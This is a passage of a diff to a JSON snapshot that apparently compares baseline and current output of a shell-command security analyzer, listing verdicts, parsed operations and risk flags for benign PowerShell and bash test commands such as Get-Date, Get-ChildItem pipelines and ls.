+              "logical_expression:$matrix[0][1]"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "$matrix[0][1]",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:$matrix[0][1]"
+          ]
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-03-backtick-lead",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "`Get-Date"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "`Get-Date",
+                "args": [],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
           }
         },
         "current": {
@@ -3090,7 +2934,7 @@
             ]
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [],
             "connectors": [],
             "paths": [],
@@ -3104,18 +2948,22 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
-          "operations": [],
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "`Get-Date",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
           "connectors": [],
           "paths": [],
           "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:unparseable"
-          ]
+          "analysisCompleteness": "complete",
+          "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [],
           "connectors": [],
           "paths": [],
@@ -3130,9 +2978,9 @@
         "baseline": {
           "ok": true,
           "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
+          "analysisCompleteness": "complete",
           "persistable": false,
-          "hasMetasyntax": false
+          "hasMetasyntax": true
         },
         "current": {
           "ok": false,
@@ -3142,14 +2990,15 @@
     }
   },
   {
-    "id": "b37-trailing-pipe",
-    "dialect": "posix-bash",
+    "id": "t2-04-nested-scriptblock",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "ls"
+            "& { param($f) $f",
+            "ForEach-Object { & $_ } }"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3166,12 +3015,816 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "ls",
+                "verb": "&",
+                "args": [
+                  "{",
+                  "param($f)",
+                  "$f"
+                ],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "ForEach-Object",
+                "args": [
+                  "{",
+                  "&",
+                  "$_",
+                  "}",
+                  "}"
+                ],
+                "segmentIndex": 1
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "& { param($f) $f",
+            "ForEach-Object { & $_ } }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "&",
+              "args": [
+                "{",
+                "param($f)",
+                "$f"
+              ],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "ForEach-Object",
+              "args": [
+                "{",
+                "&",
+                "$_",
+                "}",
+                "}"
+              ],
+              "segmentIndex": 1
+            }
+          ],
+          "connectors": [
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-05-type-literal",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "[System.IO.File]::ReadAllText(\"a.txt\")"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "[System.IO.File]::ReadAllText(a.txt)",
                 "args": [],
                 "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "[System.IO.File]::ReadAllText(\"a.txt\")"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:[System.IO.File]::ReadAllText(\"a.txt\")"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "[System.IO.File]::ReadAllText(a.txt)",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:[System.IO.File]::ReadAllText(\"a.txt\")"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-06-cast-generic",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "[list[int]]$xs = 1"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "[list[int]]$xs",
+                "args": [
+                  "=",
+                  "1"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "[list[int]]$xs = 1"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "assignment_expression:[list[int]]$xs = 1"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "[list[int]]$xs",
+              "args": [
+                "=",
+                "1"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "assignment_expression:[list[int]]$xs = 1"
+          ]
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-08-multiline-pipe",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Get-ChildItem",
+            "Where-Object Name",
+            "Measure-Object"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-ChildItem",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Where-Object",
+                "args": [
+                  "Name"
+                ],
+                "segmentIndex": 1
+              },
+              {
+                "verb": "Measure-Object",
+                "args": [],
+                "segmentIndex": 2
+              }
+            ],
+            "connectors": [
+              "|",
+              ";",
+              "|",
+              ";"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Get-ChildItem",
+            "Where-Object Name",
+            "Measure-Object"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Get-ChildItem",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Where-Object",
+                "args": [
+                  "Name"
+                ],
+                "segmentIndex": 1
+              },
+              {
+                "verb": "Measure-Object",
+                "args": [],
+                "segmentIndex": 2
+              }
+            ],
+            "connectors": [
+              "|",
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-ChildItem",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Where-Object",
+              "args": [
+                "Name"
+              ],
+              "segmentIndex": 1
+            },
+            {
+              "verb": "Measure-Object",
+              "args": [],
+              "segmentIndex": 2
+            }
+          ],
+          "connectors": [
+            "|",
+            ";",
+            "|",
+            ";"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Get-ChildItem",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Where-Object",
+              "args": [
+                "Name"
+              ],
+              "segmentIndex": 1
+            },
+            {
+              "verb": "Measure-Object",
+              "args": [],
+              "segmentIndex": 2
+            }
+          ],
+          "connectors": [
+            "|",
+            "|"
+          ],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-10-double-quoted-here",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "@\"\ninterp $($x)\n\"@"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "@;interp $($x);@",
+                "args": [],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "@\"\ninterp $($x)\n\"@"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:@\"\ninterp $($x)\n\"@"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "@;interp $($x);@",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:@\"\ninterp $($x)\n\"@"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-11-switch-statement",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "switch ($x) { 1 { \"one\" } }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "switch",
+                "args": [
+                  "($x)",
+                  "{",
+                  "1",
+                  "{",
+                  "one",
+                  "}",
+                  "}"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "switch ($x) { 1 { \"one\" } }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "switch_statement:switch ($x) { 1 { \"one\" } }"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "switch",
+              "args": [
+                "($x)",
+                "{",
+                "1",
+                "{",
+                "one",
+                "}",
+                "}"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "switch_statement:switch ($x) { 1 { \"one\" } }"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-12-add-range-step",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "$weeks = 0..3",
+            "ForEach-Object { $_ * 7 }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "$weeks",
+                "args": [
+                  "=",
+                  "0..3"
+                ],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "ForEach-Object",
+                "args": [
+                  "{",
+                  "$_",
+                  "*",
+                  "7",
+                  "}"
+                ],
+                "segmentIndex": 1
               }
             ],
             "connectors": [
@@ -3184,52 +3837,60 @@
           }
         },
         "current": {
-          "verdict": "deny",
-          "denyReason": "命令语法解析失败，无法进行安全分析",
-          "segments": [],
+          "verdict": "ask",
+          "segments": [
+            "$weeks = 0..3",
+            "ForEach-Object { $_ * 7 }"
+          ],
           "pathVerdict": {
             "decision": "ask",
-            "violations": [
-              {
-                "code": "PARSE_ERROR",
-                "message": "命令语法解析失败，无法进行安全分析",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ],
-            "outsideWorkDirRisk": true,
-            "requiresRiskAck": true
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
           },
+          "permissionDecision": "ask",
           "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": true,
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ]
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [],
             "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "parse:tree-error"
+              "assignment_expression:$weeks = 0..3 | ForEach-Object { $_ * 7 "
             ]
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "ls",
-              "args": [],
+              "verb": "$weeks",
+              "args": [
+                "=",
+                "0..3"
+              ],
               "segmentIndex": 0
+            },
+            {
+              "verb": "ForEach-Object",
+              "args": [
+                "{",
+                "$_",
+                "*",
+                "7",
+                "}"
+              ],
+              "segmentIndex": 1
             }
           ],
           "connectors": [
@@ -3241,14 +3902,14 @@
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [],
           "connectors": [],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "parse:tree-error"
+            "assignment_expression:$weeks = 0..3 | ForEach-Object { $_ * 7 "
           ]
         }
       },
@@ -3261,22 +3922,24 @@
           "hasMetasyntax": true
         },
         "current": {
-          "ok": false,
-          "auditReason": "命令语法解析失败，无法进行安全分析"
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
         }
       }
     }
   },
   {
-    "id": "b38-leading-and",
-    "dialect": "posix-bash",
+    "id": "t2-13-enum-member-access",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "",
-            "echo start"
+            "[DayOfWeek]::Monday"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3293,124 +3956,639 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "[DayOfWeek]::Monday",
+                "args": [],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "[DayOfWeek]::Monday"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:[DayOfWeek]::Monday"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "[DayOfWeek]::Monday",
+              "args": [],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:[DayOfWeek]::Monday"
+          ]
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": true,
+          "hasMetasyntax": false
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": true,
+          "hasMetasyntax": false
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-14-nested-hashtable",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "$h = @{ a = @{ b = 1 } }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "$h",
                 "args": [
-                  "start"
+                  "=",
+                  "@{",
+                  "a",
+                  "=",
+                  "@{",
+                  "b",
+                  "=",
+                  "1",
+                  "}",
+                  "}"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "$h = @{ a = @{ b = 1 } }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "assignment_expression:$h = @{ a = @{ b = 1 } }"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "$h",
+              "args": [
+                "=",
+                "@{",
+                "a",
+                "=",
+                "@{",
+                "b",
+                "=",
+                "1",
+                "}",
+                "}"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "assignment_expression:$h = @{ a = @{ b = 1 } }"
+          ]
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-15-sub-expression-in-string",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output \"count: $($items.Count)\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "count: $($items.Count)"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "Write-Output \"count: $($items.Count)\""
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "\"count: $($items.Count)\""
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "count: $($items.Count)"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "\"count: $($items.Count)\""
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "complete",
+          "unresolved": []
+        }
+      },
+      "precheck": {
+        "baseline": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
+        },
+        "current": {
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "complete",
